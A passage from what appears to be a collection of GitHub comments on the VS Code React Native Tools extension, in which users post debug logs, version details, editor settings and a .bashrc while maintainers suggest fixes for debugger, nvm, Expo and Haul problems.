\u2502\n\u2502  https://github.com/facebook/react-native                                    \u2502\n\u2502                                                                              \u2502\n\u2514\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2518\nLooking for JS files in\n   /Users/2hyjun/schaffengott/IGDEFLAM/client\n   /Users/2hyjun/schaffengott/IGDEFLAM/client/.vscode \nMetro Bundler ready.\n[Info] Packager started.\n[Info] Prewarming bundle cache. This may take a while ...\n[Info] About to get: http://localhost:8081/index.bundle?platform=ios\nLoading dependency graph, done.\n BUNDLE  [ios, dev] ./index.js \u2593\u2593\u2593\u2593\u2593\u2593\u2593\u2593\u2593\u2593\u2593\u2593\u2593\u2593\u2593\u2593 100.0% (999/999), done.\n[Warning] The Bundle Cache was prewarmed.\n[Info] Building and running application.\n[Info] Enable JS Debugging\n[Info] About to search for plist in base folder: /Users/2hyjun/Library/Developer/CoreSimulator/Devices/CEEDA4F1-75A3-4B56-93D2-DF5A98E26258/data/Containers/Data/Application pathAfter: Library/Preferences/com.schaffengott.2hyjun.igdeflam.plist in each of the apps: 00433070-D2AB-466A-813E-2118C77F1CCC,04174004-D28C-487B-A125-8B9ED75F0371,1D584609-8BB8-4AF1-ABA1-4B296AF514B2,1DBF94BA-3CCE-4DFE-B277-5D34CB168DB0,1DCE834C-B9A7-42C6-B78F-399470D7B4F9,1E7B5D1C-3DFD-4A5B-A498-65B73CF2D3C4,23A1BFD8-4E19-42EA-BE7F-BEDB2F330C2E,297E8363-3189-49B2-88C2-34F5CC33E09F,30C00A0A-C104-4970-BE6D-AA7D11D07D53,4F060A83-1C9B-4C56-972D-7762732F0352,52C96D92-5343-4578-B21A-6CD5639FF63B,64299368-0296-42F0-B69F-7FFDD9E6B178,6764984B-E15C-4437-830E-C5BAE9EE9A09,67CCD168-1C4C-49B2-A77F-2C36DE95C449,6C606676-9DDC-4673-B758-75D0FE904811,7B8ABB24-273D-42B2-B077-49CE6E80B9CC,80EF66C6-6AA7-499C-8508-C16FA899FB0F,8444F8BC-C291-409D-A09B-562A4F859156,9289D542-23FA-4C11-BB23-ABFB76EC7266,9A325A7C-5074-42A8-8B31-AA86985D680B,A0898E1B-072D-446D-A03F-E4D61C7E5922,A0F46A8F-B19F-4F23-A31C-F63BDACC771D,AF5EE4A3-5D73-468D-9B13-0072247FA948,B6369523-BA1B-4FDB-BFD2-D8AD4A4A76CA,C59E4282-C660-49CD-A87B-D1A52F7137F9,CC3F3C5A-F9F2-460F-9F81-1F4AFA3B3B15,CD14FDAF-6E65-4707-8863-50613B33F40F,CE2642E6-112E-4C64-8CF6-68967B5C1439,D3D3172B-2218-46F9-831E-8F94907D79DA,D40E1D3B-3319-4D8E-8BF4-C1F47B5A368C,D6B4E6BD-0E72-4CFE-8079-BAB026B65426,E227924E-9C40-4B50-A392-115E4F05A1E9,E820F1FE-1391-44C5-9445-105B2859C76F,EA5C2001-72CD-418D-97AF-F9E01FFB2112,EB4E5C0C-1A67-47AF-94DF-F4774CAF8E63,F25118E3-39B5-4AC0-9F75-EFB0C1713D52\nBUNDLE  [ios, dev] ./index.js \u2593\u2593\u2593\u2593\u2593\u2593\u2593\u2593\u2593\u2593\u2593\u2593\u2593\u2593\u2593\u2593 100.0% (1/1), done.\nStarting custom debugger by executing: echo A debugger is not needed:  \"/Users/2hyjun/schaffengott/IGDEFLAM/client\" \"/Users/2hyjun/schaffengott/IGDEFLAM/client/.vscode\"\n BUNDLE  [ios, dev] ./index.js \u2593\u2593\u2593\u2593\u2593\u2593\u2593\u2593\u2593\u2593\u2593\u2593\u2593\u2593\u2593\u2593 100.0% (1/1), done.\nBUNDLE  [ios, dev] ./index.js \u2593\u2593\u2593\u2593\u2593\u2593\u2593\u2593\u2593\u2593\u2593\u2593\u2593\u2593\u2593\u2593 100.0% (1/1), done.\n```\n4 - 3 Output of the Developer Tools console\n/Applications/Visual Studio Code.app/Contents/Resources/app/out/vs/workbench/workbench.main.js:1375  INFO no standard startup: panel is active\n/Applications/Visual Studio Code.app/Contents/Resources/app/out/vs/workbench/workbench.main.js:270 [Extension Host] (node:7193) DeprecationWarning: os.tmpDir() is deprecated. Use os.tmpdir() instead.\nt.log @ /Applications/Visual Studio Code.app/Contents/Resources/app/out/vs/workbench/workbench.main.js:270. fine \ud83d\ude04. Same Error on \nvscode: 0.6.13\nvscode-react-native: 1.25.1\nOS platform and version: OSX 10.13.3\nNodeJS version: 8.10.0\nRN version: 0.55.4. ",
    "MartinMasek": "I resolved it like this:\ninstalled exp through npm:\nnpm install -g exp\nrun command:\nexp login. ",
    "Dagurmart": "This should be addressed though. ",
    "danielDevelops": "i was doing about 30 sqlite database inserts and updates with both and the performance difference was about 3 seconds for chrome debugger and about 40 seconds with react-native tools. ",
    "dominictwlee": "Sure, It's:\nreact-native-cli: 2.0.1\nreact-native: 0.56.0. @ruslan-bikkinin Yep, root of react-native project created with react-native init.\nreact-native run-android works, but none of the commands in vscode are working.. @ruslan-bikkinin The only messages I get are from the Developer tools console and output as shown in my 1st post.. @ruslan-bikkinin \nSo node version has to match the one shown here? \n\nOr do you mean node -v shows the same version in both system and vscode terminal? If so, yes they both show the same version which is 10.4.0 in my situation.\nAnd yes, I'm using react-native-cli installed globally.\n. \n@ruslan-bikkinin \n. @ruslan-bikkinin \n\n\n. @iTOYS  react-native-tools.projectRoot is using the default \"\". \nMy other settings are:\n{\n    \"workbench.colorTheme\": \"Material Theme\",\n    \"files.autoSave\": \"off\",\n    \"editor.tabSize\": 2,\n    \"editor.wordWrap\": \"on\",\n    \"editor.formatOnSave\": true,\n    \"window.zoomLevel\": 0,\n    \"emmet.syntaxProfiles\": {\n        \"javascript\": \"javascriptreact\"\n    },\n    \"files.associations\": {\n        \"*.js\": \"javascriptreact\"\n    },\n    \"workbench.iconTheme\": \"eq-material-theme-icons\",\n    \"materialTheme.fixIconsRunning\": false,\n    \"workbench.statusBar.visible\": true,\n    \"workbench.activityBar.visible\": true,\n    \"prettier.requireConfig\": true,\n    \"terminal.integrated.fontSize\": 15,\n    \"typescript.validate.enable\": false,\n    \"typescript.format.enable\": false,\n    \"javascript.validate.enable\": false,\n    \"emmet.triggerExpansionOnTab\": true,\n    \"flow.useNPMPackagedFlow\": true\n}. @ruslan-bikkinin  Got this message when I completed tasks 1 and 2, any ideas why? \n\nShould I go ahead and click debug anyway?. I'm getting this in the console output:\nGulp is not installed on your system. Run npm install -g gulp to install it.\nThe only thing I can think of is that vscode isn't detecting the folder where nvm saves it's global modules.\nAny ideas?. @ruslan-bikkinin Deleted node_modules/.bin file, and the same warning still popped up so I clicked Debug anyway.\n2nd VScode popped up with message [/home/domtwlee/Projects/vscode-react-native]: Overwriting extension /home/domtwlee/.vscode/extensions/vsmobile.vscode-react-native-0.6.13 with /home/domtwlee/Projects/vscode-react-native..\n\nUnverified breakpoints when attempting to set them on the 1st vscode window where debugger is running.\n\nThis shows up when I click on debugger restart.\nBreakpoints can only be set on timers.js and net.js.\n. @iTOYS  @ruslan-bikkinin \nTried setting nvm alias default and didn't make a difference.\nSo what I did was comment out nvm commands from my .bashrc and installed nodejs directly.\ndebugger is working and projectRoot is showing up as \"/home/domtwlee/Projects/testDebugger\" which is the right path.\nSo are you saying that vscode-react-native is incompatible with nvm?\n. ###### nvm ls in both vscode terminal and system terminal:\n\n.npmrc:\n//registry.npmjs.org/:_authToken=AUTH_TOKEN_HERE\n.bashrc:\n```\n~/.bashrc: executed by bash(1) for non-login shells.\nsee /usr/share/doc/bash/examples/startup-files (in the package bash-doc)\nfor examples\nIf not running interactively, don't do anything\ncase $- in\n    i) ;;\n      *) return;;\nesac\ndon't put duplicate lines or lines starting with space in the history.\nSee bash(1) for more options\nHISTCONTROL=ignoreboth\nappend to the history file, don't overwrite it\nshopt -s histappend\nfor setting history length see HISTSIZE and HISTFILESIZE in bash(1)\nHISTSIZE=1000\nHISTFILESIZE=2000\ncheck the window size after each command and, if necessary,\nupdate the values of LINES and COLUMNS.\nshopt -s checkwinsize\nIf set, the pattern \"**\" used in a pathname expansion context will\nmatch all files and zero or more directories and subdirectories.\nshopt -s globstar\nmake less more friendly for non-text input files, see lesspipe(1)\n[ -x /usr/bin/lesspipe ] && eval \"$(SHELL=/bin/sh lesspipe)\"\nset variable identifying the chroot you work in (used in the prompt below)\nif [ -z \"${debian_chroot:-}\" ] && [ -r /etc/debian_chroot ]; then\n    debian_chroot=$(cat /etc/debian_chroot)\nfi\nset a fancy prompt (non-color, unless we know we \"want\" color)\ncase \"$TERM\" in\n    xterm-color|*-256color) color_prompt=yes;;\nesac\nuncomment for a colored prompt, if the terminal has the capability; turned\noff by default to not distract the user: the focus in a terminal window\nshould be on the output of commands, not on the prompt\nforce_color_prompt=yes\nif [ -n \"$force_color_prompt\" ]; then\n    if [ -x /usr/bin/tput ] && tput setaf 1 >&/dev/null; then\n        # We have color support; assume it's compliant with Ecma-48\n        # (ISO/IEC-6429). (Lack of such support is extremely rare, and such\n        # a case would tend to support setf rather than setaf.)\n        color_prompt=yes\n    else\n        color_prompt=\n    fi\nfi\nif [ \"$color_prompt\" = yes ]; then\n    PS1='${debian_chroot:+($debian_chroot)}[\\033[01;32m]\\u@\\h[\\033[00m]:[\\033[01;34m]\\w[\\033[00m]\\$ '\nelse\n    PS1='${debian_chroot:+($debian_chroot)}\\u@\\h:\\w\\$ '\nfi\nunset color_prompt force_color_prompt\nIf this is an xterm set the title to user@host:dir\ncase \"$TERM\" in\nxterm|rxvt)\n    PS1=\"[\\e]0;${debian_chroot:+($debian_chroot)}\\u@\\h: \\w\\a]$PS1\"\n    ;;\n*)\n    ;;\nesac\nenable color support of ls and also add handy aliases\nif [ -x /usr/bin/dircolors ]; then\n    test -r ~/.dircolors && eval \"$(dircolors -b ~/.dircolors)\" || eval \"$(dircolors -b)\"\n    alias ls='ls --color=auto'\n    #alias dir='dir --color=auto'\n    #alias vdir='vdir --color=auto'\nalias grep='grep --color=auto'\nalias fgrep='fgrep --color=auto'\nalias egrep='egrep --color=auto'\n\nfi\ncolored GCC warnings and errors\nexport GCC_COLORS='error=01;31:warning=01;35:note=01;36:caret=01;32:locus=01:quote=01'\nsome more ls aliases\nalias ll='ls -alF'\nalias la='ls -A'\nalias l='ls -CF'\nAdd an \"alert\" alias for long running commands.  Use like so:\nsleep 10; alert\nalias alert='notify-send --urgency=low -i \"$([ $? = 0 ] && echo terminal || echo error)\" \"$(history|tail -n1|sed -e '\\''s/^\\s[0-9]+\\s//;s/[;&|]\\s*alert$//'\\'')\"'\nAlias definitions.\nYou may want to put all your additions into a separate file like\n~/.bash_aliases, instead of adding them here directly.\nSee /usr/share/doc/bash-doc/examples in the bash-doc package.\nif [ -f ~/.bash_aliases ]; then\n    . ~/.bash_aliases\nfi\nenable programmable completion features (you don't need to enable\nthis, if it's already enabled in /etc/bash.bashrc and /etc/profile\nsources /etc/bash.bashrc).\nif ! shopt -oq posix; then\n  if [ -f /usr/share/bash-completion/bash_completion ]; then\n    . /usr/share/bash-completion/bash_completion\n  elif [ -f /etc/bash_completion ]; then\n    . /etc/bash_completion\n  fi\nfi\nexport PATH=$HOME/bin:$PATH\nexport NVM_DIR=\"$HOME/.nvm\"\n[ -s \"$NVM_DIR/nvm.sh\" ] && . \"$NVM_DIR/nvm.sh\"  # This loads nvm\n[ -s \"$NVM_DIR/bash_completion\" ] && . \"$NVM_DIR/bash_completion\"  # This loads nvm bash_completion\nexport PATH=\"$HOME/.yarn/bin:$PATH\"\ntabtab source for serverless package\nuninstall by removing these lines or running tabtab uninstall serverless\n[ -f /home/domtwlee/.nvm/versions/node/v10.4.0/lib/node_modules/serverless/node_modules/tabtab/.completions/serverless.bash ] && . /home/domtwlee/.nvm/versions/node/v10.4.0/lib/node_modules/serverless/node_modules/tabtab/.completions/serverless.bash\ntabtab source for sls package\nuninstall by removing these lines or running tabtab uninstall sls\n[ -f /home/domtwlee/.nvm/versions/node/v10.4.0/lib/node_modules/serverless/node_modules/tabtab/.completions/sls.bash ] && . /home/domtwlee/.nvm/versions/node/v10.4.0/lib/node_modules/serverless/node_modules/tabtab/.completions/sls.bash\nexport ANDROID_HOME=$HOME/Software/Android/Sdk\nexport PATH=$PATH:$ANDROID_HOME/tools\nexport PATH=$PATH:$ANDROID_HOME/tools/bin\nexport PATH=$PATH:$ANDROID_HOME/platform-tools\n```\nMy .bash_profile is empty.\n. @ruslan-bikkinin I managed to get it to work by doing nvm use default && code in the main terminal, but it stops working everytime I reload/open a folder/open a workspace. Any solutions to this? Because I can see this becoming really annoying. . @ruslan-bikkinin Yeah tried that, still have to declare nvm use default and launch code from terminal in order for things to work. I guess that'll have to do for now.. ",
    "rmrudro": "@ruslan-bikkinin yes.. First I reload by pressing R,R then I react-native run-android after cleaning gradle in last build. ",
    "LK": "The app is running in debug mode, when it crashes the simulator displays the red popup window and I tap on a line of the stack trace in the simulator, which brings up a new window.. Thanks for digging into it, @ruslan-bikkinin \u2014 looks like you're right, will file an issue there.. ",
    "cviktor": "I have the same issue. The debugger worked before. I cannot tie the breaking of the debugger to a specific package update \nVersion: 1.25.1\nCommit: 1dfc5e557209371715f655691b1235b6b26a06be\nDate: 2018-07-11T15:43:53.668Z\nElectron: 1.7.12\nChrome: 58.0.3029.110\nNode.js: 7.9.0\nV8: 5.8.283.38\nArchitecture: x64\nReact native tools: 0.6.13\nExpo: 27.0.2\n. ",
    "freakinruben": "@iTOYS I can't figure out how I can specify the productName in the launch.json, should this be passed on in the runArguments?. I see that it's reverted for some reason in 0.16.6 and added again in master (unreleased). That's probably why I can't get it to work.. @ruslan-bikkinin any chance this can be released again?. ",
    "rsouthgate": "Hi,\nI tried to do that... In my workspace settings the react-native-tools is highlighted as an unknown configuration setting - so not sure the set up and installation is even getting far enough to register settings... After installing and setting the log level the only thing I can see in the logs is in the Log (Window) output when I attempt to start a debug session and I see this:\n\n[2018-08-11 09:24:56.294] [renderer1] [error] spawn react-native ENOENT: Error: spawn react-native ENOENT\n  at exports._errnoException (util.js:1050:11)\n  at Process.ChildProcess._handle.onexit (internal/child_process.js:193:32)\n  at onErrorNT (internal/child_process.js:367:16)\n  at _combinedTickCallback (internal/process/next_tick.js:80:11)\n  at process._tickCallback (internal/process/next_tick.js:104:9)\n\nI'm not sure whether this is related to the react-native-tools module or not since the stack doesn't go very far!\nAnything else I can try?. Sorry, you're right. It worked straight away after that!. ",
    "buddhamangler": "From Debug Console...\nOS: darwin x64\nAdapter node: v8.9.3 x64\nvscode-chrome-debug-core: 3.17.3\n1:45:07 PM, 8/22/2018\nFrom client: initialize({\"clientID\":\"vscode\",\"clientName\":\"Visual Studio Code\",\"adapterID\":\"reactnative\",\"locale\":\"en-us\",\"linesStartAt1\":true,\"columnsStartAt1\":true,\"pathFormat\":\"path\",\"supportsVariableType\":true,\"supportsVariablePaging\":true,\"supportsRunInTerminalRequest\":true})\nTo client: {\"seq\":0,\"type\":\"response\",\"request_seq\":1,\"command\":\"initialize\",\"success\":true,\"body\":{\"exceptionBreakpointFilters\":[{\"label\":\"All Exceptions\",\"filter\":\"all\",\"default\":false},{\"label\":\"Uncaught Exceptions\",\"filter\":\"uncaught\",\"default\":false}],\"supportsConfigurationDoneRequest\":true,\"supportsSetVariable\":true,\"supportsConditionalBreakpoints\":true,\"supportsCompletionsRequest\":true,\"supportsHitConditionalBreakpoints\":true,\"supportsRestartFrame\":true,\"supportsExceptionInfoRequest\":true,\"supportsDelayedStackTraceLoading\":true,\"supportsValueFormattingOptions\":true,\"supportsEvaluateForHovers\":true,\"supportsLogPoints\":true,\"supportsTerminateRequest\":true}}\nFrom React-Native...\n[Warning] The Bundle Cache was prewarmed.\n[Info] Building and running application.\n[Info] Packager is already running.\n[Info] Prewarming bundle cache. This may take a while ...\n[Info] About to get: http://localhost:8081/index.bundle?platform=ios\nBUNDLE  [ios, dev] ./index.js \u2593\u2593\u2593\u2593\u2593\u2593\u2593\u2593\u2593\u2593\u2593\u2593\u2593\u2593\u2593\u2593 100.0% (1/1), done.\n[Warning] The Bundle Cache was prewarmed.\n[Info] Building and running application.\nFrom React Native: Run ios...\n[Warning] The Bundle Cache was prewarmed.\n[Info] Building and running application.\n[Info] Packager is already running.\n[Info] Prewarming bundle cache. This may take a while ...\n[Info] About to get: http://localhost:8081/index.bundle?platform=ios\nBUNDLE  [ios, dev] ./index.js \u2593\u2593\u2593\u2593\u2593\u2593\u2593\u2593\u2593\u2593\u2593\u2593\u2593\u2593\u2593\u2593 100.0% (1/1), done.\n[Warning] The Bundle Cache was prewarmed.\n[Info] Building and running application.\nSimulator Testing\nI am experiencing no issues with the simulator or running on device by directly playing from xcode\nSDD Information\nMacintosh HD:\nAvailable:    299.5 GB (299,501,613,056 bytes)\n  Capacity: 500 GB (500,000,858,112 bytes)\n  Mount Point:  /\n  File System:  APFS\n  Writable: Yes\n  Ignore Ownership: No\n  BSD Name: disk1s1\n  Volume UUID:  xxxxx\n  Physical Drive:\n  Device Name:  APPLE SSD SM1024L\n  Media Name:   AppleAPFSMedia\n  Medium Type:  SSD\n  Protocol: PCI-Express\n  Internal: Yes\n  Partition Map Type:   Unknown\nQuestion 2\nLet me get back to you on this. ",
    "livein21st": "@iTOYS The issue is still remain after manually run command, react-native run-ios --deviceand then attach to packager.. ",
    "SounD120": "Hi @livein21st . I just have tested Debug iOS scenario on that configuration:\n1) macOS Mojave 10.14\n2) Node.js 8.12\n3) VS Code 1.29\n4) Xcode 10.1(10B61) with Legacy Build Setup for project\n5) React Native 0.55.4 (changed \"babel-preset-react-native\" version to 4.0.0 in package.json because of this bug)\n6) iOS device version 12.1\nThis setup works without any problem. Please submit new issue using our issue template and describe your situation in details.. Hi @jas99. Could you please paste an output from React Native: Run android output window? \n\n. @jas99 My test config for this case:\n- Windows 10 x64 (android 8.1 emulator)\n- Node.js 8.12\n- RN 0.57.3\n- VSCode v 1.28.1\nAnd it's working without such errors. So could you try to use latest LTS node.js version or latest stable, cause it's looking like node.js issue?. Hi @jas99. Looks like the original issue was solved, so I'm closing this issue for now, but if you have some updates - you can reopen this issue, or create new with all new information you have. Thanks.. Hi, @IceApriler . Did you try to enable remote JS debugging? If your issue is not connected to this, please create new one describing your particular case using our issue template.. Hi @reza7rm , I've been tested fresh React Native 0.57.1 application, and I am facing errors with babel package, but on 0.57.3 debugging works fine for Android 7, 8 and 8.1, so could you please try to update React Native version to 0.57.3 and let us know does it work for you?. Hi @VictDog. I tried to run fresh React Native 0.56.0 app on Node.js version 8.12 and it's runs without such errors, so if it possible could you please try Node 8.12 LTS and let us know does it work for you?. \n~Hi @mjbvz . \nWe use previewHtml to render web page exp://192.168.10.76:19000/ is generated by Expo Framework, which have unstandard scheme exp://. This is the code we use:~\nts\nvscode.commands.executeCommand(\"vscode.previewHtml\", vscode.Uri.parse(exponentUrl), 1, \"Expo QR code\");\n~and it renders such a page:~ ~Looks like previewHtml magically resolves exp://, but we didn't find any documentation about how to do the same with WebView API. Could you please clarify what exactly we need to do to get WebView API work this way?~\nUPDATE: \nWe found out that our \"magic\" was in that line, so it works now :) \n. Hi @mjbvz . We migrated from vscode.previewHtml to new VS Code WebView API for this extension. Thanks.. @ruslan-bikkinin Yes, sure. \nisparta@4.1.0 is the latest version of the package and it still using minimatch version which is vulnerable.\nvscode-chrome-debug-core@3.17.3 has vulnerable https-proxy-agent but I think it would break us if we update it right now.. @ruslan-bikkinin Sure. . @ruslan-bikkinin not yet. I'll add it soon. Hi @CrazzzyDev and thanks for contacting us. Could you please give us a minimal demo application where this issue is reproduces, and also describe your workflow with that multiroot project? This would be helpful for better understanding of the situation from our side.. Hi @CrazzzyDev . We have found the core of the problem connected with Cannot GET /debuggerWorker.js error and it will be fixed in the new version of the extension. With respect to your question about debugging with Haul, yes extension support Haul debugging, but only via Attach to packager debug scenario, that means you must run packager and the application outside the VS Code.  In other cases the React Native Metro bundler will be used for debugging.. @CrazzzyDev We are performing prerelease testing right now, so as soon as we finish it a new version will be released. This issue were caused by the extension tried get debuggerWorker.js file from incorrect URL for projects with Haul, so you can try manually apply fix proposed in PR #880 to your installed extension at this path if you need to.\n~/.vscode/extensions/vsmobile.vscode-react-native-0.7.0/src/debugger/scriptImporter.js\nIf you try, please let us know how it will work for you.. @CrazzzyDev Please make sure that when you starting Attach to packager debug configuration no any other debugger is running on background. For example, Haul opens browser tab with its own debugger automatically when you start your application via Haul packager, so maybe you need to close it before you start Attach to packager and then reload your app.. Due to official Expo team commentary all RN projects that is going to be ran using expo must have installed expo package. To solve the issue run npm i expo --save-dev. Hi @fantasy525 , I tried to debug your application with Chrome debugger on Windows and Linux and it looks like there are some problems with source maps inside React Native. As you can see at this GIF I was able to reproduce the problem in Chrome Debugger without using VS Code at all.  I would recommend you to create an issue in React Native repo and describe your situation there, also add a link to this issue and attach this GIF there as well. Feel free to re-open if you have any updates in the future.\n\n. Hi, @PDostalek . This placeholder will be replaced by the path to the local.properties file for Android project. In case of this error the next string will be Using Android SDK location from PATH.\nYou can find more context here. Hi @PDostalek , Node is a platform reference in both cases and it should not be translated. Internal Node Debugger is a reference for internal Visual Studio Code debugger for Node.js  vscode-node-debug2. Hi @friederbluemle . Thanks for your contribution! Actually we change only package.nls.json file, and other files will be updated when the main file will be localized to that languages, so could you please revert changes from files: package.nls.cs.json,  package.nls.pl.json and package.nls.tr.json?. Hi @MarcoLLeite , thanks for reaching us. Could you please provide a small demo of your app for better understanding from our side? Also could you please fill up outputs using the template below? \n\nOutput of the Debug Console (View -> Toggle Debug Console):\nPASTE OUTPUT HERE\nOutput of the React-Native output channel (View -> Toggle Output -> Select React-Native in ListBox):\nPASTE OUTPUT HERE\nOutput of the Developer Tools console (Help -> Toggle Developer Tools -> Select Console tab):\nPASTE OUTPUT HERE\nAlso it would be great if you add operational system on which you facing this.\nAlso please make sure that Remote JS Debug is enabled on your device/emulator, we have instructions for enabling that setting in our README.. Hi @MarcoLLeite . Do you have a chance to look at this?. Hi @MarcoLLeite . I'm closing this due to inactivity, feel free to reopen the issue and provide additional information if you still facing this problem.. Couldn't. Yes, I think it can improve the user experience.. Thanks, I fixed that. Thanks for pointing out, i'll fix this.. Yes, it's not used now . Looks like webpage is working without this options, so I deleted them.. Thanks for pointing out on this. I'll fix that.. Yes, sure. There was the semantic error after migrating on Typescript 2.8.3 because the loggedOutput variable was not been used anywhere.. There was the semantic error after migrating on Typescript 2.8.3 because the result variable was not been used anywhere.. There was the semantic error after migrating on Typescript 2.8.3 because the _innerError variable was not been used anywhere.. I agree.. I agree.. Fixed.. In this case yes, because it is a part of error message: \"Error while exectuting command: '{0}'\". In this case yes, because it is a part of error message: \"Error while exectuting command: '{0}'\". I added error with this code to the errorStrings.ts so  would be processed now as part of the WorkspaceNotFound error string. I added error with this code to the errorStrings.ts so  would be processed now as part of the WorkspaceNotFound error string. Thanks for pointing. I had fixed that.. Thanks for pointing. I had fixed that.. Thanks for pointing. I had fixed that.. That's how this Error would handle after this replacing\n\n. That's how this error would handle after this change\n\n. That's how it would look after this change \n\n. All this entries are processed by this function . Yes because it will now be handled with a command rejection, that's how it would look after this change\n\n. This condition is deprecated, but I replaced it because it uses in our androidPlatform class tests.. We cannot do that because reason.message requires strict match with the error string that will be rendered in our stdout console. This approach gives us such guarantees.. Oh, I tried and it looks like no. I'll remove this mention. Thanks for pointing! Done. Is the second empty arg have no influence to ExponentHelper object?. I think about that pipe indent, need to move it more to left. I'm not sure but the original PR uses this variable. I think it would be better to leave it here until we have any updated about this variable.. Removed!. This folder have it's own package.json and it compiles after npm install command inside this folder, so I decided to divide this folder from our main tests. Sure, I'll check it out. This files contains copyrights, but they don't suit our code style. I'll fix this. This is the time for all Spectron promises that we are willing to wait for doing something (clicks await, etc). This methods have not this logging, but in case of any Promise fails they log the stage of their failing.. This \\n divides tests setup sequence from tests. . Setup function interrupts and test sequence fails. It is a long story :)\nBut I can revert it if needed.. I added port parameter to the emulator execution command. So it name would be emulator- + port where port equals 5554.. Added!. Good proposal, I'll do it.. Done.. Done.. Added a full link but it looks like UI element that renders tips cannot parse URL, and we also unable to copy this link from this tip window. Sure.. This tests using yarn, so I update yarn.lock. Not yet. I think it is target not for the current PR.. I have tested it on CI, it works. Anyway waitUntil will retry for 30s, so it could find needed UI element. Sure, I already thought about it.. WaitUntil retries our commands until it returns true, otherwise it reach timeout and throw.. 1000 means 1000 ms. But I agree that this comment should be fixed.. Agree.. Agree.. Actually this function does not return Promise now. This function is for Android only for now, I think that is not the target of this PR. Do we need this change?. Can we add --dont-delete-vsix argument to the launch.json Launch Smoke Test debug configuration? It for the local tests, so I think it should be there. Please make sure that Mocha will not hang during the tests due to this change\nhttps://boneskull.com/mocha-v4-nears-release/#mochawontforceexit. Do we need to use both require and import?. What does this change do?. I agree, but seems that Spectron gets waitTime in seconds. Oh, I'll fix this. Agree, but I think it's better to do that in another PR. This function works with VS Code UI so I decided to place in Debug helper to not mix it with other helpers. \n",
    "reza7rm": "I still encounter this issue on react native 0.57.1 and react native tools version:0.6.18 on windows 10. I donno why old issues reappear in new versions. It's really frustrating.... @ruslan-bikkinin \nhere is the result after adding \"trace\":\"verbose\" to debug config:\nOS: win32 x64\nAdapter node: v8.9.3 x64\nvscode-chrome-debug-core: 3.17.3\n4:59:11 PM, 10/24/2018\nFrom client: initialize({\"clientID\":\"vscode\",\"clientName\":\"Visual Studio Code\",\"adapterID\":\"reactnative\",\"pathFormat\":\"path\",\"linesStartAt1\":true,\"columnsStartAt1\":true,\"supportsVariableType\":true,\"supportsVariablePaging\":true,\"supportsRunInTerminalRequest\":true,\"locale\":\"en-us\"})\nTo client: {\"seq\":0,\"type\":\"response\",\"request_seq\":1,\"command\":\"initialize\",\"success\":true,\"body\":{\"exceptionBreakpointFilters\":[{\"label\":\"All Exceptions\",\"filter\":\"all\",\"default\":false},{\"label\":\"Uncaught Exceptions\",\"filter\":\"uncaught\",\"default\":false}],\"supportsConfigurationDoneRequest\":true,\"supportsSetVariable\":true,\"supportsConditionalBreakpoints\":true,\"supportsCompletionsRequest\":true,\"supportsHitConditionalBreakpoints\":true,\"supportsRestartFrame\":true,\"supportsExceptionInfoRequest\":true,\"supportsDelayedStackTraceLoading\":true,\"supportsValueFormattingOptions\":true,\"supportsEvaluateForHovers\":true,\"supportsLoadedSourcesRequest\":true,\"supportsLogPoints\":true,\"supportsTerminateRequest\":false}}\nHandle launch request: {\n \"name\": \"Debug Android\",\n  \"program\": \"C:\\\\Users\\\\Reza7\\\\Desktop\\\\projects\\\\tekcy/.vscode/launchReactNative.js\",\n  \"type\": \"reactnative\",\n  \"request\": \"launch\",\n  \"platform\": \"android\",\n  \"sourceMaps\": true,\n  \"outDir\": \"C:\\\\Users\\\\Reza7\\\\Desktop\\\\projects\\\\tekcy/.vscode/.react\",\n  \"trace\": \"verbose\",\n  \"__sessionId\": \"197dd702-d530-493b-91f6-ec08b80274b4\"\n}\nStarting debugger app worker.\nAbout to download: http://localhost:8081/debugger-ui/debuggerWorker.js to: C:\\Users\\Reza7\\Desktop\\projects\\tekcy\\.vscode\\.react\\debuggerWorker.js\nEstablished a connection with the Proxy (Packager) to the React Native application\n. @ruslan-bikkinin \nThanks for your fast responses.\nthe output channel output is\n```\n[Info] 10-24 17:00:08.199  4578  4578 D ReactNative: ReactInstanceManager.ctor()\n[Info] 10-24 17:00:08.225  4578  4578 D ReactNative: ReactInstanceManager.createReactContextInBackground()\n10-24 17:00:08.225  4578  4578 D ReactNative: ReactInstanceManager.recreateReactContextInBackgroundInner()\n[Info] 10-24 17:00:13.831  4578  4578 D ReactNative: ReactInstanceManager.onJSBundleLoadedFromServer()\n[Info] 10-24 17:00:13.832  4578  4578 D ReactNative: ReactInstanceManager.recreateReactContextInBackground()\n10-24 17:00:13.832  4578  4578 D ReactNative: ReactInstanceManager.runCreateReactContextOnNewThread()\n[Info] 10-24 17:00:13.843  4578  4614 D ReactNative: ReactInstanceManager.createReactContext()\n[Info] 10-24 17:00:13.960  4578  4614 D ReactNative: Initializing React Xplat Bridge.\n[Info] 10-24 17:00:13.963  4578  4614 D ReactNative: Initializing React Xplat Bridge before initializeBridge\n[Info] 10-24 17:00:13.967  4578  4614 D ReactNative: Initializing React Xplat Bridge after initializeBridge\n[Info] 10-24 17:00:13.967  4578  4614 D ReactNative: CatalystInstanceImpl.runJSBundle()\n[Info] 10-24 17:00:13.968  4578  4618 D ReactNative: ReactInstanceManager.setupReactContext()\n[Info] 10-24 17:00:13.969  4578  4618 D ReactNative: CatalystInstanceImpl.initialize()\n[Info] 10-24 17:00:13.972  4578  4618 D ReactNative: ReactInstanceManager.attachRootViewToInstance()\n[Info] 10-24 17:00:14.593  4578  4617 W ReactNativeJS: Require cycle: node_modules\\native-base\\dist\\src\\index.js -> node_modules\\native-base\\dist\\src\\basic\\DatePicker.js -> node_modules\\native-base\\dist\\src\\index.js\n10-24 17:00:14.593  4578  4617 W ReactNativeJS: \n10-24 17:00:14.593  4578  4617 W ReactNativeJS: Require cycles are allowed, but can result in uninitialized values. Consider refactoring to remove the need for a cycle.\n[Info] 10-24 17:00:14.639  4578  4617 W ReactNativeJS: Require cycle: node_modules\\native-base\\dist\\src\\index.js -> node_modules\\native-base\\dist\\src\\basic\\Tabs\\index.js 